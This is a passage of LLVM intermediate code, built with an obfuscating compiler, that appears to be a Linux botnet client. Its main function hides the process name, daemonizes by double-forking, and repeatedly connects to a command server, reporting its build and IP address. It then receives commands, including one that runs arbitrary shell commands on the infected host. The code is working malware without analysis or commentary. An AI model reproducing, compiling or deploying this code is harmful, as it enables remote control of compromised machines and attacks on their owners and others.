  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #5
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #5
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79

; <label>:97:                                     ; preds = %79
  br label %98

; <label>:98:                                     ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

; <label>:101:                                    ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.489, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %27 = call i8* @inet_ntoa(i32 %26) #5
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.491, i32 0, i32 0), i8* %25, i8* %27)
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @strlen(i8* %34) #10
  %36 = call i8* @strncpy(i8* %31, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i64 %35) #5
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i8** %38, align 8
  %39 = load i8*, i8** %6, align 8
  %40 = ptrtoint i8* %39 to i64
  %41 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %40, i32 0, i32 0, i32 0)
  %42 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %43 = call i32 @getpid() #5
  %44 = xor i32 %42, %43
  call void @srand(i32 %44) #5
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = call i32 @getpid() #5
  %47 = xor i32 %45, %46
  call void @init_rand(i32 %47)
  %48 = call i32 @getOurIP()
  %49 = call i32 @fork() #5
  store i32 %49, i32* %7, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %2
  %52 = load i32, i32* %7, align 4
  %53 = call i32 @waitpid(i32 %52, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:54:                                     ; preds = %2
  %55 = load i32, i32* %7, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %68, label %57

; <label>:57:                                     ; preds = %54
  %58 = call i32 @fork() #5
  store i32 %58, i32* %8, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %57
  call void @exit(i32 0) #14
  unreachable

; <label>:61:                                     ; preds = %57
  %62 = load i32, i32* %8, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

; <label>:64:                                     ; preds = %61
  br label %66

; <label>:65:                                     ; preds = %61
  br label %66

; <label>:66:                                     ; preds = %65, %64
  br label %67

; <label>:67:                                     ; preds = %66
  br label %69

; <label>:68:                                     ; preds = %54
  br label %69

; <label>:69:                                     ; preds = %68, %67
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = call i32 @setsid() #5
  %72 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.492, i32 0, i32 0)) #5
  %73 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %74

; <label>:74:                                     ; preds = %369, %77, %70
  %75 = call i32 @initConnection()
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %79

; <label>:77:                                     ; preds = %74
  %78 = call i32 @sleep(i32 5)
  br label %74

; <label>:79:                                     ; preds = %74
  %80 = load i32, i32* @mainCommSock, align 4
  %81 = call i8* @getBuild()
  %82 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %83 = call i8* @inet_ntoa(i32 %82) #5
  %84 = call i32 (i32, i8*, ...) @sockprintf(i32 %80, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.493, i32 0, i32 0), i8* %81, i8* %83)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %85

; <label>:85:                                     ; preds = %368, %290, %212, %174, %79
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %88 = call i32 @recvLine(i32 %86, i8* %87, i32 4096)
  store i32 %88, i32* %11, align 4
  %89 = icmp ne i32 %88, -1
  br i1 %89, label %90, label %369

; <label>:90:                                     ; preds = %85
  store i32 0, i32* %12, align 4
  br label %91

; <label>:91:                                     ; preds = %162, %90
  %92 = load i32, i32* %12, align 4
  %93 = sext i32 %92 to i64
  %94 = load i64, i64* @numpids, align 8
  %95 = icmp ult i64 %93, %94
  br i1 %95, label %96, label %165

; <label>:96:                                     ; preds = %91
  %97 = load i32*, i32** @pids, align 8
  %98 = load i32, i32* %12, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i32, i32* %97, i64 %99
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @waitpid(i32 %101, i32* null, i32 1)
  %103 = icmp sgt i32 %102, 0
  br i1 %103, label %104, label %161

; <label>:104:                                    ; preds = %96
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %14, align 4
  br label %107

; <label>:107:                                    ; preds = %123, %104
  %108 = load i32, i32* %14, align 4
  %109 = zext i32 %108 to i64
  %110 = load i64, i64* @numpids, align 8
  %111 = icmp ult i64 %109, %110
  br i1 %111, label %112, label %126

; <label>:112:                                    ; preds = %107
  %113 = load i32*, i32** @pids, align 8
  %114 = load i32, i32* %14, align 4
  %115 = zext i32 %114 to i64
  %116 = getelementptr inbounds i32, i32* %113, i64 %115
  %117 = load i32, i32* %116, align 4
  %118 = load i32*, i32** @pids, align 8
  %119 = load i32, i32* %14, align 4
  %120 = sub i32 %119, 1
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds i32, i32* %118, i64 %121
  store i32 %117, i32* %122, align 4
  br label %123

; <label>:123:                                    ; preds = %112
  %124 = load i32, i32* %14, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %14, align 4
  br label %107

; <label>:126:                                    ; preds = %107
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %14, align 4
  %129 = sub i32 %128, 1
  %130 = zext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %127, i64 %130
  store i32 0, i32* %131, align 4
  %132 = load i64, i64* @numpids, align 8
  %133 = add i64 %132, -1
  store i64 %133, i64* @numpids, align 8
  %134 = load i64, i64* @numpids, align 8
  %135 = add i64 %134, 1
  %136 = mul i64 %135, 4
  %137 = call noalias i8* @malloc(i64 %136) #5
  %138 = bitcast i8* %137 to i32*
  store i32* %138, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %139

; <label>:139:                                    ; preds = %154, %126
  %140 = load i32, i32* %14, align 4
  %141 = zext i32 %140 to i64
  %142 = load i64, i64* @numpids, align 8
  %143 = icmp ult i64 %141, %142
  br i1 %143, label %144, label %157

; <label>:144:                                    ; preds = %139
  %145 = load i32*, i32** @pids, align 8
  %146 = load i32, i32* %14, align 4
  %147 = zext i32 %146 to i64
  %148 = getelementptr inbounds i32, i32* %145, i64 %147
  %149 = load i32, i32* %148, align 4
  %150 = load i32*, i32** %13, align 8
  %151 = load i32, i32* %14, align 4
  %152 = zext i32 %151 to i64
  %153 = getelementptr inbounds i32, i32* %150, i64 %152
  store i32 %149, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %144
  %155 = load i32, i32* %14, align 4
  %156 = add i32 %155, 1
  store i32 %156, i32* %14, align 4
  br label %139

; <label>:157:                                    ; preds = %139
  %158 = load i32*, i32** @pids, align 8
  %159 = bitcast i32* %158 to i8*
  call void @free(i8* %159) #5
  %160 = load i32*, i32** %13, align 8
  store i32* %160, i32** @pids, align 8
  br label %161

; <label>:161:                                    ; preds = %157, %96
  br label %162

; <label>:162:                                    ; preds = %161
  %163 = load i32, i32* %12, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %12, align 4
  br label %91

; <label>:165:                                    ; preds = %91
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %167
  store i8 0, i8* %168, align 1
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %169)
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %171 = call i8* @strstr(i8* %170, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #10
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %173 = icmp eq i8* %171, %172
  br i1 %173, label %174, label %177

; <label>:174:                                    ; preds = %165
  %175 = load i32, i32* @mainCommSock, align 4
  %176 = call i32 (i32, i8*, ...) @sockprintf(i32 %175, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.494, i32 0, i32 0))
  br label %85

; <label>:177:                                    ; preds = %165
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %179 = call i8* @strstr(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.495, i32 0, i32 0)) #10
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %181 = icmp eq i8* %179, %180
  br i1 %181, label %182, label %183

; <label>:182:                                    ; preds = %177
  call void @exit(i32 0) #14
  unreachable

; <label>:183:                                    ; preds = %177
  %184 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %184, i8** %15, align 8
  %185 = load i8*, i8** %15, align 8
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp eq i32 %187, 33
  br i1 %188, label %189, label %368

; <label>:189:                                    ; preds = %183
  %190 = load i8*, i8** %15, align 8
  %191 = getelementptr inbounds i8, i8* %190, i64 1
  store i8* %191, i8** %16, align 8
  br label %192

; <label>:192:                                    ; preds = %204, %189
  %193 = load i8*, i8** %16, align 8
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp ne i32 %195, 32
  br i1 %196, label %197, label %202

; <label>:197:                                    ; preds = %192
  %198 = load i8*, i8** %16, align 8
  %199 = load i8, i8* %198, align 1
  %200 = zext i8 %199 to i32
  %201 = icmp ne i32 %200, 0
  br label %202

; <label>:202:                                    ; preds = %197, %192
  %203 = phi i1 [ false, %192 ], [ %201, %197 ]
  br i1 %203, label %204, label %207

; <label>:204:                                    ; preds = %202
  %205 = load i8*, i8** %16, align 8
  %206 = getelementptr inbounds i8, i8* %205, i32 1
  store i8* %206, i8** %16, align 8
  br label %192

; <label>:207:                                    ; preds = %202
  %208 = load i8*, i8** %16, align 8
  %209 = load i8, i8* %208, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 0
  br i1 %211, label %212, label %213

; <label>:212:                                    ; preds = %207
  br label %85

; <label>:213:                                    ; preds = %207
  %214 = load i8*, i8** %16, align 8
  store i8 0, i8* %214, align 1
  %215 = load i8*, i8** %15, align 8
  %216 = getelementptr inbounds i8, i8* %215, i64 1
  store i8* %216, i8** %16, align 8
  %217 = load i8*, i8** %15, align 8
  %218 = load i8*, i8** %16, align 8
  %219 = call i64 @strlen(i8* %218) #10
  %220 = getelementptr inbounds i8, i8* %217, i64 %219
  %221 = getelementptr inbounds i8, i8* %220, i64 2
  store i8* %221, i8** %15, align 8
  br label %222

; <label>:222:                                    ; preds = %242, %213
  %223 = load i8*, i8** %15, align 8
  %224 = load i8*, i8** %15, align 8
  %225 = call i64 @strlen(i8* %224) #10
  %226 = sub i64 %225, 1
  %227 = getelementptr inbounds i8, i8* %223, i64 %226
  %228 = load i8, i8* %227, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 10
  br i1 %230, label %240, label %231

; <label>:231:                                    ; preds = %222
  %232 = load i8*, i8** %15, align 8
  %233 = load i8*, i8** %15, align 8
  %234 = call i64 @strlen(i8* %233) #10
  %235 = sub i64 %234, 1
  %236 = getelementptr inbounds i8, i8* %232, i64 %235
  %237 = load i8, i8* %236, align 1
  %238 = zext i8 %237 to i32
  %239 = icmp eq i32 %238, 13
  br label %240

; <label>:240:                                    ; preds = %231, %222
  %241 = phi i1 [ true, %222 ], [ %239, %231 ]
  br i1 %241, label %242, label %248

; <label>:242:                                    ; preds = %240
  %243 = load i8*, i8** %15, align 8
  %244 = load i8*, i8** %15, align 8
  %245 = call i64 @strlen(i8* %244) #10
  %246 = sub i64 %245, 1
  %247 = getelementptr inbounds i8, i8* %243, i64 %246
  store i8 0, i8* %247, align 1
  br label %222

; <label>:248:                                    ; preds = %240
  %249 = load i8*, i8** %15, align 8
  store i8* %249, i8** %17, align 8
  br label %250

; <label>:250:                                    ; preds = %262, %248
  %251 = load i8*, i8** %15, align 8
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp ne i32 %253, 32
  br i1 %254, label %255, label %260

; <label>:255:                                    ; preds = %250
  %256 = load i8*, i8** %15, align 8
  %257 = load i8, i8* %256, align 1
  %258 = zext i8 %257 to i32
  %259 = icmp ne i32 %258, 0
  br label %260

; <label>:260:                                    ; preds = %255, %250
  %261 = phi i1 [ false, %250 ], [ %259, %255 ]
  br i1 %261, label %262, label %265

; <label>:262:                                    ; preds = %260
  %263 = load i8*, i8** %15, align 8
  %264 = getelementptr inbounds i8, i8* %263, i32 1
  store i8* %264, i8** %15, align 8
  br label %250

; <label>:265:                                    ; preds = %260
  %266 = load i8*, i8** %15, align 8
  store i8 0, i8* %266, align 1
  %267 = load i8*, i8** %15, align 8
  %268 = getelementptr inbounds i8, i8* %267, i32 1
  store i8* %268, i8** %15, align 8
  %269 = load i8*, i8** %17, align 8
  store i8* %269, i8** %18, align 8
  br label %270

; <label>:270:                                    ; preds = %274, %265
  %271 = load i8*, i8** %18, align 8
  %272 = load i8, i8* %271, align 1
  %273 = icmp ne i8 %272, 0
  br i1 %273, label %274, label %283

; <label>:274:                                    ; preds = %270
  %275 = load i8*, i8** %18, align 8
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = call i32 @toupper(i32 %277) #10
  %279 = trunc i32 %278 to i8
  %280 = load i8*, i8** %18, align 8
  store i8 %279, i8* %280, align 1
  %281 = load i8*, i8** %18, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %18, align 8
  br label %270

; <label>:283:                                    ; preds = %270
  %284 = load i8*, i8** %17, align 8
  %285 = call i32 @strcmp(i8* %284, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.496, i32 0, i32 0)) #10
  %286 = icmp eq i32 %285, 0
  br i1 %286, label %287, label %310

; <label>:287:                                    ; preds = %283
  %288 = call i32 @listFork()
  %289 = icmp ne i32 %288, 0
  br i1 %289, label %290, label %291

; <label>:290:                                    ; preds = %287
  br label %85

; <label>:291:                                    ; preds = %287
  %292 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %292, i8 0, i64 1024, i32 16, i1 false)
  %293 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %294 = load i8*, i8** %15, align 8
  %295 = call i32 (i8*, i8*, ...) @szprintf(i8* %293, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.497, i32 0, i32 0), i8* %294)
  %296 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %297 = call i32 @fdpopen(i8* %296, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0))
  store i32 %297, i32* %20, align 4
  br label %298

; <label>:298:                                    ; preds = %303, %291
  %299 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %300 = load i32, i32* %20, align 4
  %301 = call i8* @fdgets(i8* %299, i32 1024, i32 %300)
  %302 = icmp ne i8* %301, null
  br i1 %302, label %303, label %307

; <label>:303:                                    ; preds = %298
  %304 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %304)
  %305 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %305, i8 0, i64 1024, i32 16, i1 false)
  %306 = call i32 @sleep(i32 1)
  br label %298

; <label>:307:                                    ; preds = %298
  %308 = load i32, i32* %20, align 4
  %309 = call i32 @fdpclose(i32 %308)
  call void @exit(i32 0) #14
  unreachable

; <label>:310:                                    ; preds = %283
  store i32 1, i32* %22, align 4
  %311 = load i8*, i8** %15, align 8
  %312 = call i8* @strtok(i8* %311, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.498, i32 0, i32 0)) #5
  store i8* %312, i8** %23, align 8
  %313 = load i8*, i8** %17, align 8
  %314 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %313, i8** %314, align 16
  br label %315

; <label>:315:                                    ; preds = %346, %310
  %316 = load i8*, i8** %23, align 8
  %317 = icmp ne i8* %316, null
  br i1 %317, label %318, label %348

; <label>:318:                                    ; preds = %315
  %319 = load i8*, i8** %23, align 8
  %320 = load i8, i8* %319, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp ne i32 %321, 10
  br i1 %322, label %323, label %346

; <label>:323:                                    ; preds = %318
  %324 = load i8*, i8** %23, align 8
  %325 = call i64 @strlen(i8* %324) #10
  %326 = add i64 %325, 1
  %327 = call noalias i8* @malloc(i64 %326) #5
  %328 = load i32, i32* %22, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %329
  store i8* %327, i8** %330, align 8
  %331 = load i32, i32* %22, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %332
  %334 = load i8*, i8** %333, align 8
  %335 = load i8*, i8** %23, align 8
  %336 = call i64 @strlen(i8* %335) #10
  %337 = add i64 %336, 1
  call void @llvm.memset.p0i8.i64(i8* %334, i8 0, i64 %337, i32 1, i1 false)
  %338 = load i32, i32* %22, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %339
  %341 = load i8*, i8** %340, align 8
  %342 = load i8*, i8** %23, align 8
  %343 = call i8* @strcpy(i8* %341, i8* %342) #5
  %344 = load i32, i32* %22, align 4
  %345 = add nsw i32 %344, 1
  store i32 %345, i32* %22, align 4
  br label %346

; <label>:346:                                    ; preds = %323, %318
  %347 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.498, i32 0, i32 0)) #5
  store i8* %347, i8** %23, align 8
  br label %315

; <label>:348:                                    ; preds = %315
  %349 = load i32, i32* %22, align 4
  %350 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %349, i8** %350)
  %351 = load i32, i32* %22, align 4
  %352 = icmp sgt i32 %351, 1
  br i1 %352, label %353, label %367

; <label>:353:                                    ; preds = %348
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %354

; <label>:354:                                    ; preds = %363, %353
  %355 = load i32, i32* %24, align 4
  %356 = load i32, i32* %22, align 4
  %357 = icmp slt i32 %355, %356
  br i1 %357, label %358, label %366

; <label>:358:                                    ; preds = %354
  %359 = load i32, i32* %24, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %360
  %362 = load i8*, i8** %361, align 8
  call void @free(i8* %362) #5
  br label %363

; <label>:363:                                    ; preds = %358
  %364 = load i32, i32* %24, align 4
  %365 = add nsw i32 %364, 1
  store i32 %365, i32* %24, align 4
  br label %354

; <label>:366:                                    ; preds = %354
  br label %367

; <label>:367:                                    ; preds = %366, %348
  br label %368

; <label>:368:                                    ; preds = %367, %183
  br label %85

; <label>:369:                                    ; preds = %85
  %370 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.499, i32 0, i32 0))
  br label %74
                                                  ; No predecessors!
  %372 = load i32, i32* %3, align 4
  ret i32 %372
}

declare i32 @printf(i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #2

declare i32 @prctl(...) #4

; Function Attrs: nounwind
declare i32 @setsid() #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #2

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #2

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146594516}
!2 = !{i32 -2146593825}
!3 = !{i32 -2146593131}
!4 = !{i32 -2146592376}
!5 = !{i32 -2146591549}
!6 = !{i32 -2146590728}
!7 = !{i32 -2146589713}
